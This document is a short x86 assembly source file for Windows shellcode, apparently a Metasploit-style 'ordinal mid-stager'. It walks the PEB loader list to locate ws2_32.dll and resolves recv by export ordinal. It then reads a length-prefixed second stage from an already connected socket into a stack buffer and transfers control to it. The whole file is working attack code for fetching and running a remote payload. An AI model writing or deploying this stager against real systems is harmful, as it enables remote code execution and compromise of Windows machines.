BITS 32

; ordinal mid-stager that ensures a complete read of a subsequent
; stage occurs by reading in a 4 byte length descriptor and then
; reading the entire next stage.


	; edi holds the socket descriptor
find_module_list:
	cld                       ; clear direction flag for string instructions
	xor ebx, ebx              ; clear ebx
	mov eax, [fs:ebx + 0x30]  ; PEB ptr in eax
	mov eax, [eax + 0xc]      ; LoaderData ptr to LDR_DATA
	mov edx, [eax + 0x1c]     ; flink initialization ptr to LDR_MODULE

module_loop:
	mov edx, [edx]            ; move to the next LDR_MODULE
	mov esi, [edx + 0x20]     ; ptr to unicode BaseDllName

	                          ; patented skape kungfu follows
	                          ; ninja comparison tekneek, all rights reserved
	lodsd                     ; skip ws
	lodsd                     ; load \x32\x00\x5f\x00 (32)
	dec esi                   ; offset back one for a better add "hash" (spoon)
	add eax, [esi]            ; Add 0x32003300 to 0x005f0032 -> 0x325f3322
	cmp eax, 0x325f3332       ; Is it true, is it actually you? ws2_32?
	jnz module_loop           ; it isn't, keep trying
	mov ebp, [edx + 0x8]      ; it is you! dll base address into ebp

	; dll base is in ebp
resolve_functions:
	mov eax, [ebp + 0x3c]       ; PE offset into eax
	mov ecx, [ebp + eax + 0x78] ; Export Table offset into ecx
	mov ecx, [ebp + ecx + 0x1c] ; Address Table offset into ecx
	add ecx, ebp                ; absolute Address Table address into ecx

	mov esi, [ecx + 0x3c]       ; ordinal 16 (recv)
	add esi, ebp                ; make absolute

alloc_length_buffer:
	push ebp
	mov  ebx, esp 

get_buffer_length:
	push byte 0x0
	push byte 0x4
	push ebx
	push edi
	call esi

allocate_stack_buffer:
	sub  esp, [ebx]
	and  sp, 0xfffc
	mov  ebp, esp
	push ebp

read_stage_loop:
	push byte 0x0
	push dword [ebx]
	push ebp
	push edi
	call esi
	add  ebp, eax
	sub  [ebx], eax
	test eax, eax
	jnz  read_stage_loop

call_stage:
	ret
